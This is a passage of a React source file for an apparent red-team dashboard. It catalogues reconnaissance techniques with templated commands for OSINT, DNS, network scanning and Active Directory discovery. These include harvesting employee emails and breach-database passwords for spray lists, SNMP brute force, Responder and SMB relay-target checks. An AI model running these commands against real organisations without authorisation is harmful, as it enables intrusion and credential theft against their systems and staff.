'use client'

import { copyText } from '@/lib/clipboard'
import { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
import {
  Search, Radar, Play, CheckCircle2, Zap, Globe, Network, Server, Eye,
  ChevronRight, Copy, Check,
} from 'lucide-react'
import dynamic from 'next/dynamic'
import { reconApi, SEVERITY_COLORS, type ScanFinding } from '@/lib/reconApi'
import { BackButton } from '@/components/ui/BackButton'
import { cn } from '@/lib/utils'

const LiveOutputTerminal = dynamic(
  () => import('@/components/ops/LiveOutputTerminal'),
  { ssr: false },
)

const MONO = { fontFamily: 'JetBrains Mono, monospace' }

const TABS = [
  { key: 'osint',   label: 'OSINT',              icon: Globe,   color: '#a78bfa' },
  { key: 'dns',     label: 'DNS',                icon: Server,  color: '#60a5fa' },
  { key: 'network', label: 'Network Discovery',  icon: Network, color: '#34d399' },
  { key: 'ad',      label: 'AD Discovery',       icon: Eye,     color: '#fbbf24' },
] as const
type TabKey = typeof TABS[number]['key']

type ReconTech = {
  id: string
  title: string
  mitre: string
  risk: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW'
  tool: string
  platform: 'linux' | 'windows' | 'both'
  description: string
  commands: { label: string; cmd: string; platform?: string }[]
}

const TECHNIQUES: Record<TabKey, ReconTech[]> = {
  osint: [
    {
      id: 'recon-cert-transparency',
      title: 'Certificate Transparency',
      mitre: 'T1596.003', risk: 'LOW', tool: 'crt.sh / certstream', platform: 'linux',
      description: 'Query crt.sh and certificate transparency logs to enumerate subdomains and infrastructure from issued TLS certificates — no network interaction with target required.',
      commands: [
        { label: 'crt.sh domain query', cmd: "curl -s 'https://crt.sh/?q=%.{Domain}&output=json' | jq -r '.[].name_value' | sort -u", platform: 'linux' },
        { label: 'certstream live watch', cmd: 'certstream | grep {Domain}', platform: 'linux' },
        { label: 'crt.sh organization query', cmd: "curl -s 'https://crt.sh/?o={OrgName}&output=json' | jq -r '.[].name_value' | sort -u", platform: 'linux' },
      ],
    },
    {
      id: 'recon-whois-asn',
      title: 'WHOIS / ASN Discovery',
      mitre: 'T1590.005', risk: 'LOW', tool: 'whois / amass / bgp.he.net', platform: 'linux',
      description: 'Map the target\'s IP ranges, ASN ownership, and registration details. Identifies additional IP space not covered in scope documentation.',
      commands: [
        { label: 'whois domain lookup', cmd: 'whois {Domain}', platform: 'linux' },
        { label: 'amass intel + WHOIS', cmd: 'amass intel -whois -d {Domain}', platform: 'linux' },
        { label: 'ASN BGP lookup', cmd: "curl -s 'https://bgp.he.net/search?search[search]={OrgName}&commit=Search' | grep -oP 'AS\\d+'", platform: 'linux' },
        { label: 'IP → ASN range', cmd: 'whois -h whois.radb.net {IPAddress} | grep -E "^route|^origin"', platform: 'linux' },
      ],
    },
    {
      id: 'recon-email-harvest',
      title: 'Email Harvesting',
      mitre: 'T1589.002', risk: 'LOW', tool: 'theHarvester / hunter.io', platform: 'linux',
      description: 'Harvest employee email addresses and usernames for user enumeration lists and password spray campaigns. Identifies naming convention used by the org.',
      commands: [
        { label: 'theHarvester multi-source', cmd: 'theHarvester -d {Domain} -l 500 -b google,bing,linkedin,duckduckgo', platform: 'linux' },
        { label: 'hunter.io domain search', cmd: "curl 'https://api.hunter.io/v2/domain-search?domain={Domain}&api_key={HunterAPIKey}'", platform: 'linux' },
        { label: 'Extract usernames from emails', cmd: "theHarvester -d {Domain} -l 500 -b all -f /tmp/harvest.xml && grep -oP '[a-z]+\\.[a-z]+(?=@)' /tmp/harvest.xml | sort -u > /tmp/users.txt", platform: 'linux' },
      ],
    },
    {
      id: 'recon-o365-enum',
      title: 'O365 / Azure User Enumeration',
      mitre: 'T1589.003', risk: 'MEDIUM', tool: 'AADInternals / o365enum', platform: 'linux',
      description: 'Enumerate valid M365 and Entra ID usernames without authentication. Uses timing differences in login endpoints or GetUserRealm API responses.',
      commands: [
        { label: 'o365enum spray user list', cmd: 'python3 o365enum.py -u {UserList} -d {Domain} -t 10', platform: 'linux' },
        { label: 'AADInternals tenant recon', cmd: 'Invoke-AADIntReconAsOutsider -Domain {Domain} | Format-Table', platform: 'windows' },
        { label: 'GetUserRealm API probe', cmd: "curl 'https://login.microsoftonline.com/getuserrealm.srf?login={Email}&json=1'", platform: 'linux' },
        { label: 'Enumerate tenant federation', cmd: 'Invoke-AADIntReconAsOutsider -UserName {Email} | Select TenantID,TenantName,AuthURL', platform: 'windows' },
      ],
    },
    {
      id: 'recon-shodan-censys',
      title: 'Shodan / Censys Infrastructure',
      mitre: 'T1596.005', risk: 'LOW', tool: 'shodan / censys-python', platform: 'linux',
      description: 'Query Shodan and Censys for exposed ports, banners, and TLS certificate data tied to the target org — no direct network contact with the target required.',
      commands: [
        { label: 'Shodan org search', cmd: 'shodan search org:"{OrgName}" --fields ip_str,port,hostnames', platform: 'linux' },
        { label: 'Shodan host details', cmd: 'shodan host {IPAddress}', platform: 'linux' },
        { label: 'Shodan SSL cert search', cmd: "shodan search 'ssl.cert.subject.cn:\"{Domain}\"' --fields ip_str,port,transport", platform: 'linux' },
        { label: 'Censys host search', cmd: 'censys search "autonomous_system.name:{OrgName}" --index-type hosts', platform: 'linux' },
      ],
    },
    {
      id: 'recon-linkedin-osint',
      title: 'LinkedIn / Social Media OSINT',
      mitre: 'T1593.001', risk: 'LOW', tool: 'theHarvester / linkedin2username', platform: 'linux',
      description: 'Harvest employee names and roles from LinkedIn to build a username list, identify org structure, and discover AD naming conventions for password spray campaigns.',
      commands: [
        { label: 'theHarvester LinkedIn', cmd: 'theHarvester -d {Domain} -l 500 -b linkedin', platform: 'linux' },
        { label: 'linkedin2username generate', cmd: 'python3 linkedin2username.py -c "{OrgName}" -n 5', platform: 'linux' },
        { label: 'recon-ng LinkedIn module', cmd: "recon-ng -m recon/companies-contacts/linkedin_auth -o COMPANY='{OrgName}'", platform: 'linux' },
        { label: 'Extract naming convention', cmd: "theHarvester -d {Domain} -b linkedin -l 200 -f /tmp/linkedin.xml && grep -oP '[a-z]+\\.[a-z]+' /tmp/linkedin.xml | sort -u > /tmp/name_format.txt", platform: 'linux' },
      ],
    },
    {
      id: 'recon-google-dorks',
      title: 'Google Dorking (GHDB)',
      mitre: 'T1593', risk: 'LOW', tool: 'googler / dorkbot', platform: 'linux',
      description: 'Use Google search operators to surface exposed files, login portals, and credentials indexed from the target domain — entirely passive, no target network contact.',
      commands: [
        { label: 'Exposed file types', cmd: 'googler "site:{Domain} filetype:pdf OR filetype:docx OR filetype:xlsx"', platform: 'linux' },
        { label: 'Login portals dork', cmd: 'googler "site:{Domain} inurl:login OR inurl:admin OR inurl:portal"', platform: 'linux' },
        { label: 'Credential leak dork', cmd: 'googler "site:{Domain} \\"password\\" OR \\"credentials\\" filetype:txt"', platform: 'linux' },
        { label: 'Pastebin leak search', cmd: 'googler "\\"@{Domain}\\" site:pastebin.com"', platform: 'linux' },
      ],
    },
    {
      id: 'recon-github-recon',
      title: 'GitHub / GitLab Code Recon',
      mitre: 'T1593.003', risk: 'MEDIUM', tool: 'trufflehog / gitleaks / gitrob', platform: 'linux',
      description: 'Search public repositories for leaked credentials, API keys, and config files committed by employees — a common source of plaintext domain passwords.',
      commands: [
        { label: 'trufflehog org scan', cmd: 'trufflehog github --org={OrgName} --only-verified', platform: 'linux' },
        { label: 'gitleaks detect', cmd: 'gitleaks detect --source /tmp/{OrgName}-repos --report-format json --report-path /tmp/leaks.json', platform: 'linux' },
        { label: 'GitHub API code search', cmd: "curl -H 'Authorization: token {GitHubToken}' 'https://api.github.com/search/code?q={Domain}+org:{OrgName}'", platform: 'linux' },
        { label: 'gitrob org scan', cmd: 'gitrob --github-access-token {GitHubToken} {OrgName}', platform: 'linux' },
      ],
    },
    {
      id: 'recon-breach-data',
      title: 'Pastebin / Breach Data Search',
      mitre: 'T1589', risk: 'LOW', tool: 'HIBP API / dehashed / pwndb', platform: 'linux',
      description: 'Search breach databases and paste sites for leaked credentials tied to the target domain — provides ready-to-use password lists for spraying without touching the target.',
      commands: [
        { label: 'HaveIBeenPwned domain', cmd: "curl -s 'https://haveibeenpwned.com/api/v3/breachedaccount/{Email}' -H 'hibp-api-key: {HIBPKey}'", platform: 'linux' },
        { label: 'Dehashed domain search', cmd: "curl -s 'https://api.dehashed.com/search?query=email:@{Domain}' -u '{Email}:{DehashedAPIKey}' | jq '.entries[].password' | sort -u", platform: 'linux' },
        { label: 'pwndb email search', cmd: "python3 pwndb.py --type email --target '@{Domain}'", platform: 'linux' },
        { label: 'Extract plaintext passwords', cmd: "grep -r '@{Domain}' /tmp/breach-data/ | grep -oP '(?<=:)[^:]+$' | sort -u > /tmp/breach_passwords.txt", platform: 'linux' },
      ],
    },
    {
      id: 'recon-passive-dns',
      title: 'Passive DNS / DNS History',
      mitre: 'T1596.001', risk: 'LOW', tool: 'SecurityTrails / dnstwist / threatcrowd', platform: 'linux',
      description: 'Query passive DNS databases for historical A records and subdomains — reveals decommissioned infrastructure still exposed and CDN origins behind edge IPs.',
      commands: [
        { label: 'SecurityTrails DNS history', cmd: "curl -s 'https://api.securitytrails.com/v1/history/{Domain}/dns/a' -H 'apikey: {SecurityTrailsKey}' | jq '.records[].values[].ip'", platform: 'linux' },
        { label: 'RiskIQ PassiveTotal', cmd: "curl -s 'https://api.passivetotal.org/v2/dns/passive?query={Domain}' -u '{User}:{APIKey}' | jq '.results[].resolve'", platform: 'linux' },
        { label: 'dnstwist permutations', cmd: 'dnstwist {Domain} --registered --format csv -o /tmp/dnstwist_{Domain}.csv', platform: 'linux' },
        { label: 'ThreatCrowd passive DNS', cmd: "curl -s 'https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={Domain}' | jq '.resolutions[].ip_address'", platform: 'linux' },
      ],
    },
    {
      id: 'recon-wayback-archive',
      title: 'Wayback Machine Archive Recon',
      mitre: 'T1593', risk: 'LOW', tool: 'waybackurls / gau', platform: 'linux',
      description: 'Mine archived web snapshots for old login portals, API endpoints, and sensitive parameters — finds content removed from live sites but still accessible via cache.',
      commands: [
        { label: 'waybackurls all URLs', cmd: 'echo {Domain} | waybackurls | tee /tmp/wayback_{Domain}.txt', platform: 'linux' },
        { label: 'gau historical URLs', cmd: 'gau {Domain} | tee /tmp/gau_{Domain}.txt', platform: 'linux' },
        { label: 'Filter interesting paths', cmd: "cat /tmp/wayback_{Domain}.txt | grep -E '\\.php|\\.asp|\\.aspx|\\.jsp|login|admin|password|config' | sort -u", platform: 'linux' },
        { label: 'CDX API full crawl', cmd: "curl 'http://web.archive.org/cdx/search/cdx?url=*.{Domain}&output=text&fl=original&collapse=urlkey' | sort -u > /tmp/cdx_{Domain}.txt", platform: 'linux' },
      ],
    },
    {
      id: 'recon-cloud-storage',
      title: 'Cloud Storage Enumeration',
      mitre: 'T1530', risk: 'MEDIUM', tool: 'CloudBrute / s3scanner / az CLI', platform: 'linux',
      description: 'Discover misconfigured S3 buckets, Azure Blob containers, and GCP storage linked to the org — public cloud assets are frequently overlooked and may expose sensitive files.',
      commands: [
        { label: 'CloudBrute all providers', cmd: 'python3 CloudBrute.py -d {Domain} -k {OrgName} -t 80 -T 10 -w /usr/share/seclists/Discovery/Web-Content/common.txt', platform: 'linux' },
        { label: 's3scanner enumerate', cmd: 'python3 s3scanner.py --buckets-file /tmp/s3_wordlist.txt --out-file /tmp/s3_results.txt', platform: 'linux' },
        { label: 'Azure Blob discovery', cmd: "az storage account list --query \"[?contains(name,'{OrgName}')]\" 2>/dev/null; curl -s 'https://{OrgName}.blob.core.windows.net/?comp=list'", platform: 'linux' },
        { label: 'GCP bucket probe', cmd: "for word in {OrgName} {OrgName}-backup {OrgName}-data {OrgName}-prod; do curl -skI https://storage.googleapis.com/$word 2>&1 | head -1; echo \" <- $word\"; done", platform: 'linux' },
      ],
    },
  ],

  dns: [
    {
      id: 'recon-dns-enum',
      title: 'DNS Zone Transfer & Record Dump',
      mitre: 'T1590.002', risk: 'MEDIUM', tool: 'dig / fierce / dnsrecon', platform: 'linux',
      description: 'Attempt AXFR zone transfers and enumerate all DNS records — A/AAAA/MX/NS/SOA/SRV. Discovers internal hostnames and Kerberos/LDAP service records.',
      commands: [
        { label: 'AXFR zone transfer', cmd: 'dig axfr {Domain} @{DC_IP}', platform: 'linux' },
        { label: 'All record types dump', cmd: 'dig {Domain} ANY +noall +answer @{DC_IP}', platform: 'linux' },
        { label: 'Kerberos / LDAP SRV records', cmd: 'dig _kerberos._tcp.{Domain} SRV @{DC_IP} && dig _ldap._tcp.{Domain} SRV @{DC_IP}', platform: 'linux' },
        { label: 'fierce domain scan', cmd: 'fierce --domain {Domain} --dns-servers {DC_IP}', platform: 'linux' },
        { label: 'dnsrecon standard enum', cmd: 'dnsrecon -d {Domain} -t std', platform: 'linux' },
      ],
    },
    {
      id: 'recon-subdomain-brute',
      title: 'Subdomain Enumeration',
      mitre: 'T1590.001', risk: 'MEDIUM', tool: 'amass / gobuster / dnsx', platform: 'linux',
      description: 'Brute-force and passively enumerate subdomains using certificate transparency, DNS wordlists, and resolution. Finds web apps and services not in scope docs.',
      commands: [
        { label: 'amass passive (no DNS noise)', cmd: 'amass enum -passive -d {Domain}', platform: 'linux' },
        { label: 'gobuster DNS brute', cmd: 'gobuster dns -d {Domain} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r {DC_IP}', platform: 'linux' },
        { label: 'dnsx resolve and filter live', cmd: 'dnsx -l {SubdomainList} -r {DC_IP} -a -resp', platform: 'linux' },
        { label: 'massdns fast resolve', cmd: 'massdns -r /usr/share/seclists/Miscellaneous/dns-resolvers.txt -t A {SubdomainList} -o S', platform: 'linux' },
      ],
    },
    {
      id: 'recon-spf-dmarc',
      title: 'SPF / DMARC / DKIM Analysis',
      mitre: 'T1590.002', risk: 'LOW', tool: 'dig / mxtoolbox', platform: 'linux',
      description: 'Enumerate mail security records to identify misconfigured SPF/DMARC that allows email spoofing. Weak or absent DMARC policies are a direct phishing vector.',
      commands: [
        { label: 'SPF record check', cmd: 'dig {Domain} TXT | grep -i spf', platform: 'linux' },
        { label: 'DMARC policy check', cmd: 'dig _dmarc.{Domain} TXT', platform: 'linux' },
        { label: 'DKIM selector probe', cmd: 'dig default._domainkey.{Domain} TXT && dig google._domainkey.{Domain} TXT', platform: 'linux' },
        { label: 'MX record + mail server', cmd: 'dig {Domain} MX && dig {MailServer} A', platform: 'linux' },
      ],
    },
    {
      id: 'recon-reverse-dns',
      title: 'Reverse DNS / PTR Sweep',
      mitre: 'T1590.002', risk: 'LOW', tool: 'dnsrecon / nmap / dig', platform: 'linux',
      description: 'Reverse-resolve the entire subnet to map IP→hostname associations. Reveals hosts not in forward DNS and confirms DC hostname vs IP alignment.',
      commands: [
        { label: 'dnsrecon reverse sweep', cmd: 'dnsrecon -r {Subnet} -n {DC_IP} -t rvl', platform: 'linux' },
        { label: 'nmap reverse DNS', cmd: 'nmap -sn -R --dns-servers {DC_IP} {Subnet} | grep "report for"', platform: 'linux' },
        { label: 'dig PTR single host', cmd: 'dig -x {IPAddress} @{DC_IP} +short', platform: 'linux' },
        { label: 'Bash PTR sweep loop', cmd: "for i in $(seq 1 254); do r=$(dig -x {NetworkPrefix}.$i @{DC_IP} +short 2>/dev/null); [ -n \"$r\" ] && echo \"{NetworkPrefix}.$i -> $r\"; done", platform: 'linux' },
      ],
    },
    {
      id: 'recon-dns-cache-snoop',
      title: 'DNS Cache Snooping',
      mitre: 'T1046', risk: 'MEDIUM', tool: 'dig / python3', platform: 'linux',
      description: 'Query the DC DNS cache non-recursively to infer which hostnames were recently resolved — reveals active internal services without generating query logs on the target.',
      commands: [
        { label: 'Non-recursive cache probe', cmd: 'dig @{DC_IP} {TargetHost} A +norecurse', platform: 'linux' },
        { label: 'Internal service probe', cmd: "for svc in dc dc01 dc02 exchange mail smtp ldap vpn rdp citrix; do r=$(dig @{DC_IP} $svc.{Domain} +norecurse +short 2>/dev/null); [ -n \"$r\" ] && echo \"CACHED: $svc.{Domain} -> $r\"; done", platform: 'linux' },
        { label: 'Batch wordlist snoop', cmd: "while read d; do r=$(dig @{DC_IP} $d.{Domain} +norecurse +short 2>/dev/null); [ -n \"$r\" ] && echo \"CACHED: $d -> $r\"; done < /usr/share/seclists/Discovery/DNS/namelist.txt", platform: 'linux' },
      ],
    },
    {
      id: 'recon-mdns-avahi',
      title: 'mDNS / Avahi Service Discovery',
      mitre: 'T1590.005', risk: 'LOW', tool: 'avahi-browse / nmap', platform: 'linux',
      description: 'Discover services broadcasting via mDNS (port 5353) on the local segment — printers, file shares, and management interfaces often advertise themselves without authentication.',
      commands: [
        { label: 'avahi-browse all services', cmd: 'avahi-browse -a -t 2>/dev/null | grep -v "^[+-]"', platform: 'linux' },
        { label: 'nmap mDNS service discovery', cmd: 'nmap -p 5353 -sU --script dns-service-discovery {Subnet}', platform: 'linux' },
        { label: 'mdns-scan passive listen', cmd: 'mdns-scan 2>/dev/null | head -50', platform: 'linux' },
        { label: 'Query specific mDNS services', cmd: 'avahi-browse -r _smb._tcp _http._tcp _ftp._tcp -t 2>/dev/null', platform: 'linux' },
      ],
    },
    {
      id: 'recon-dnssec-walk',
      title: 'DNSSEC Zone Walking',
      mitre: 'T1590.002', risk: 'LOW', tool: 'ldns-walk / nmap', platform: 'linux',
      description: 'Walk DNSSEC NSEC records to enumerate all zone entries — zones signed with NSEC (not NSEC3) leak the full DNS namespace without requiring a zone transfer.',
      commands: [
        { label: 'ldns-walk NSEC walk', cmd: 'ldns-walk @{DC_IP} {Domain}', platform: 'linux' },
        { label: 'dig DNSKEY check', cmd: 'dig {Domain} DNSKEY @{DC_IP} +short', platform: 'linux' },
        { label: 'nmap NSEC enumeration', cmd: 'nmap --script dns-nsec-enum,dns-nsec3-enum -p 53 {DC_IP} --script-args "dns-nsec-enum.domains={Domain}"', platform: 'linux' },
        { label: 'dnswalk zone integrity', cmd: 'dnswalk {Domain}.', platform: 'linux' },
      ],
    },
    {
      id: 'recon-internal-dns-brute',
      title: 'Internal DNS Brute Force',
      mitre: 'T1590.001', risk: 'MEDIUM', tool: 'gobuster / shuffledns / dnsrecon', platform: 'linux',
      description: 'Brute-force internal hostnames against the DC DNS resolver — discovers admin interfaces, staging systems, and services not visible externally.',
      commands: [
        { label: 'gobuster DNS internal', cmd: 'gobuster dns -d {Domain} -w /usr/share/seclists/Discovery/DNS/namelist.txt -r {DC_IP} --timeout 5s -t 50', platform: 'linux' },
        { label: 'dnsrecon brute force', cmd: 'dnsrecon -d {Domain} -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -n {DC_IP}', platform: 'linux' },
        { label: 'shuffledns fast resolve', cmd: 'shuffledns -d {Domain} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r /tmp/resolvers.txt -o /tmp/internal_hosts.txt', platform: 'linux' },
        { label: 'dnsx bulk resolve', cmd: 'dnsx -l /tmp/internal_hosts.txt -r {DC_IP} -a -resp -o /tmp/resolved.txt', platform: 'linux' },
      ],
    },
  ],

  network: [
    {
      id: 'recon-network-sweep',
      title: 'masscan / nmap AD Port Sweep',
      mitre: 'T1046', risk: 'MEDIUM', tool: 'masscan / nmap', platform: 'linux',
      description: 'High-speed port scan of AD-relevant ports across subnets to map domain infrastructure — DCs, file servers, ADCS CAs, and WinRM targets.',
      commands: [
        { label: 'masscan AD ports (fast)', cmd: 'masscan {Subnet} -p 88,389,445,636,3268,3269,5985,8080 --rate=1000 -oG /tmp/masscan_ad.txt', platform: 'linux' },
        { label: 'nmap service detection (DC ports)', cmd: 'nmap -sV -p 88,389,445,636,3268,5985 --open {Subnet} -oN /tmp/ad_services.txt', platform: 'linux' },
        { label: 'Find DCs by Kerberos port', cmd: 'nmap -p 88 --open {Subnet} | grep -B4 "open"', platform: 'linux' },
        { label: 'ADCS CA discovery (port 80/443)', cmd: 'nmap -p 80,443,8080 --open --script http-title {Subnet} | grep -B3 "certsrv\\|ADCS"', platform: 'linux' },
      ],
    },
    {
      id: 'recon-nbtscan',
      title: 'NetBIOS / LLMNR Discovery',
      mitre: 'T1046', risk: 'LOW', tool: 'nbtscan / nmap / nmblookup', platform: 'linux',
      description: 'Discover Windows hosts, NetBIOS names, MAC addresses, and domain/workgroup membership. Identifies hosts that will respond to LLMNR/NBNS — targets for Responder.',
      commands: [
        { label: 'nbtscan subnet', cmd: 'nbtscan -r {Subnet}', platform: 'linux' },
        { label: 'nmap NetBIOS NSE', cmd: 'nmap -sU -p 137 --script nbstat {Subnet}', platform: 'linux' },
        { label: 'nmblookup host info', cmd: 'nmblookup -A {DC_IP}', platform: 'linux' },
        { label: 'LLMNR responder test (passive)', cmd: 'python3 Responder.py -I {Interface} -A', platform: 'linux' },
      ],
    },
    {
      id: 'recon-ipv6-discover',
      title: 'IPv6 Host Discovery',
      mitre: 'T1590.005', risk: 'LOW', tool: 'nmap / mitm6 / alive6', platform: 'linux',
      description: 'Discover hosts on the IPv6 network. Many organizations have IPv6 enabled but unmonitored — ideal for stealth recon and mitm6 DHCPv6 attacks.',
      commands: [
        { label: 'nmap IPv6 link-local scan', cmd: 'nmap -6 -sn ff02::1 --interface {Interface}', platform: 'linux' },
        { label: 'ping6 all-nodes multicast', cmd: 'ping6 -c3 ff02::1%{Interface}', platform: 'linux' },
        { label: 'alive6 host discovery', cmd: 'alive6 {Interface}', platform: 'linux' },
        { label: 'mitm6 passive mode (listen only)', cmd: 'mitm6 -d {Domain} --passive', platform: 'linux' },
      ],
    },
    {
      id: 'recon-nmap-vuln',
      title: 'Nmap Vulnerability Scan (NSE)',
      mitre: 'T1210', risk: 'HIGH', tool: 'nmap NSE', platform: 'linux',
      description: 'Run Nmap vulnerability scripts against AD hosts to identify EternalBlue (MS17-010), PrinterBug, and other unauthenticated vuln conditions before cred-based attacks.',
      commands: [
        { label: 'SMB vulnerability scripts', cmd: 'nmap -p 445 --script smb-vuln-* {Target} -oN /tmp/smb_vuln.txt', platform: 'linux' },
        { label: 'MS17-010 EternalBlue check', cmd: 'nmap -p 445 --script smb-vuln-ms17-010 {Subnet}', platform: 'linux' },
        { label: 'All safe vuln scripts', cmd: 'nmap --script vuln -p 88,135,139,389,445,636 {Target}', platform: 'linux' },
        { label: 'SMB signing check (relay prerequisite)', cmd: 'nxc smb {Subnet} --gen-relay-list /tmp/relay_targets.txt', platform: 'linux' },
      ],
    },
    {
      id: 'recon-arp-scan',
      title: 'ARP Scan / Layer 2 Discovery',
      mitre: 'T1018', risk: 'LOW', tool: 'arp-scan / netdiscover', platform: 'linux',
      description: 'Discover live hosts on the local segment via ARP — bypasses firewall/ICMP filtering and reveals MAC addresses for OS fingerprinting and vendor identification.',
      commands: [
        { label: 'arp-scan local subnet', cmd: 'arp-scan -l --interface {Interface}', platform: 'linux' },
        { label: 'arp-scan specific subnet', cmd: 'arp-scan {Subnet} --interface {Interface} --ignoredups', platform: 'linux' },
        { label: 'netdiscover passive', cmd: 'netdiscover -r {Subnet} -i {Interface} -P', platform: 'linux' },
        { label: 'nmap ARP ping', cmd: 'nmap -PR -sn {Subnet} -oG /tmp/arp_hosts.txt', platform: 'linux' },
      ],
    },
    {
      id: 'recon-icmp-sweep',
      title: 'ICMP Ping Sweep',
      mitre: 'T1018', risk: 'LOW', tool: 'nmap / fping / masscan', platform: 'linux',
      description: 'Sweep a subnet with ICMP echo to discover all live hosts quickly — the standard first step before targeted port scans to map the full attack surface.',
      commands: [
        { label: 'nmap ping sweep', cmd: 'nmap -sn {Subnet} -oG /tmp/alive_hosts.txt && grep "Up" /tmp/alive_hosts.txt | awk \'{print $2}\' > /tmp/live.txt', platform: 'linux' },
        { label: 'fping sweep (fast)', cmd: 'fping -a -g {Subnet} 2>/dev/null | tee /tmp/alive_hosts.txt', platform: 'linux' },
        { label: 'masscan ICMP sweep', cmd: 'masscan {Subnet} -p0 --ping --rate=500 -oG /tmp/masscan_alive.txt', platform: 'linux' },
        { label: 'Bash ICMP one-liner', cmd: "for i in $(seq 1 254); do ping -c1 -W1 {NetworkPrefix}.$i &>/dev/null && echo \"{NetworkPrefix}.$i alive\"; done", platform: 'linux' },
      ],
    },
    {
      id: 'recon-snmp-enum',
      title: 'SNMP Community String Enum',
      mitre: 'T1046', risk: 'MEDIUM', tool: 'onesixtyone / snmpwalk / snmp-check', platform: 'linux',
      description: 'Brute-force SNMP community strings on UDP 161 — default "public"/"private" still common, exposing hardware info, routing tables, and AD host details.',
      commands: [
        { label: 'onesixtyone community sweep', cmd: 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {Subnet}', platform: 'linux' },
        { label: 'snmpwalk system info', cmd: 'snmpwalk -v2c -c public {Target} 1.3.6.1.2.1.1', platform: 'linux' },
        { label: 'snmp-check full enum', cmd: 'snmp-check {Target} -c public -v 2c -d', platform: 'linux' },
        { label: 'nmap SNMP brute', cmd: 'nmap -sU -p 161 --script snmp-brute,snmp-info,snmp-sysdescr {Subnet}', platform: 'linux' },
      ],
    },
    {
      id: 'recon-winrm-rdp',
      title: 'WinRM / RDP Service Discovery',
      mitre: 'T1021', risk: 'MEDIUM', tool: 'nmap / nxc', platform: 'linux',
      description: 'Identify hosts with WinRM (5985/5986) and RDP (3389) exposed — the primary lateral movement surfaces in AD environments once credentials are obtained.',
      commands: [
        { label: 'nmap WinRM + RDP sweep', cmd: 'nmap -p 5985,5986,3389 --open {Subnet} -oN /tmp/winrm_rdp.txt', platform: 'linux' },
        { label: 'nxc WinRM discovery', cmd: 'nxc winrm {Subnet} 2>/dev/null | grep -v "[-]"', platform: 'linux' },
        { label: 'nxc RDP discovery', cmd: 'nxc rdp {Subnet} 2>/dev/null | grep -v "[-]"', platform: 'linux' },
        { label: 'RDP encryption check', cmd: 'nmap -p 3389 --script rdp-enum-encryption {Subnet}', platform: 'linux' },
      ],
    },
    {
      id: 'recon-web-app-discovery',
      title: 'Web App Discovery (httpx)',
      mitre: 'T1046', risk: 'LOW', tool: 'httpx / whatweb / nmap', platform: 'linux',
      description: 'Probe all live hosts for HTTP/HTTPS services — finds management consoles, ADCS web enrollment, Exchange OWA, and IIS apps on non-standard ports.',
      commands: [
        { label: 'httpx full probe', cmd: 'httpx -l /tmp/live.txt -title -status-code -tech-detect -ports 80,443,8080,8443,8888,9090 -o /tmp/web_apps.txt', platform: 'linux' },
        { label: 'nmap web title sweep', cmd: 'nmap -p 80,443,8080,8443 --open --script http-title {Subnet} | grep -E "report|title"', platform: 'linux' },
        { label: 'whatweb fingerprint', cmd: 'whatweb {Target} -a 3 --log-json /tmp/whatweb.json', platform: 'linux' },
        { label: 'ADCS web enrollment check', cmd: 'curl -sk https://{DC_IP}/certsrv/ | grep -i "certificate services" && echo "[+] ADCS found"', platform: 'linux' },
      ],
    },
    {
      id: 'recon-printer-iot',
      title: 'Printer / IoT Device Discovery',
      mitre: 'T1046', risk: 'LOW', tool: 'nmap / nxc', platform: 'linux',
      description: 'Discover network printers and IoT devices — MFP admin portals expose PJL/IPP services and often cache scan-to-email credentials and domain config.',
      commands: [
        { label: 'nmap printer port scan', cmd: 'nmap -p 9100,515,631,80,443 --open {Subnet} --script printer-info,pjl-ready-message -oN /tmp/printers.txt', platform: 'linux' },
        { label: 'IPP printer enumeration', cmd: 'nmap -p 631 --open --script ipp-printer-info {Subnet}', platform: 'linux' },
        { label: 'HTTP title vendor hunt', cmd: 'nmap -p 80 --open --script http-title {Subnet} | grep -iB3 "HP\\|Xerox\\|Ricoh\\|Canon\\|Brother\\|Kyocera"', platform: 'linux' },
        { label: 'nxc SMB printer names', cmd: 'nxc smb {Subnet} 2>/dev/null | grep -i "print"', platform: 'linux' },
      ],
    },
    {
      id: 'recon-dhcp-discovery',
      title: 'DHCP Server Discovery',
      mitre: 'T1590.005', risk: 'LOW', tool: 'nmap / dhcpdump / tcpdump', platform: 'linux',
      description: 'Discover DHCP servers on the segment — rogue or misconfigured servers reveal IP ranges, default gateways, DNS servers, and domain names broadcast to all hosts.',
      commands: [
        { label: 'nmap broadcast DHCP discover', cmd: 'nmap --script broadcast-dhcp-discover -e {Interface}', platform: 'linux' },
        { label: 'dhcpdump passive capture', cmd: 'dhcpdump -i {Interface} 2>/dev/null | head -50', platform: 'linux' },
        { label: 'tcpdump DHCP traffic', cmd: 'tcpdump -i {Interface} -n port 67 or port 68 -c 20', platform: 'linux' },
        { label: 'nmap DHCP inform probe', cmd: 'nmap -sU -p 67 --script broadcast-dhcp-discover --script-args broadcast-dhcp-discover.interface={Interface}', platform: 'linux' },
      ],
    },
    {
      id: 'recon-traceroute-map',
      title: 'Network Path / Traceroute',
      mitre: 'T1590.004', risk: 'LOW', tool: 'traceroute / mtr / nmap', platform: 'linux',
      description: 'Map the network path to DCs and key targets to identify firewalls, routers, and segmentation boundaries — reveals architecture and potential pivot points.',
      commands: [
        { label: 'traceroute to DC', cmd: 'traceroute -n {DC_IP}', platform: 'linux' },
        { label: 'mtr continuous path map', cmd: 'mtr --report --no-dns --cycles 3 {DC_IP}', platform: 'linux' },
        { label: 'TCP traceroute port 445', cmd: 'tcptraceroute {DC_IP} 445', platform: 'linux' },
        { label: 'nmap traceroute', cmd: 'nmap --traceroute -sn {DC_IP} -v', platform: 'linux' },
      ],
    },
  ],

  ad: [
    {
      id: 'recon-ldap-anon',
      title: 'LDAP Anonymous Bind',
      mitre: 'T1087.002', risk: 'HIGH', tool: 'ldapsearch / nmap', platform: 'linux',
      description: 'Attempt unauthenticated LDAP bind to enumerate users, groups, and domain info. Legacy environments and misconfigurations may expose full directory without credentials.',
      commands: [
        { label: 'Anonymous user enumeration', cmd: "ldapsearch -x -H ldap://{DC_IP} -b 'DC={Domain},DC=local' '(objectClass=person)' sAMAccountName", platform: 'linux' },
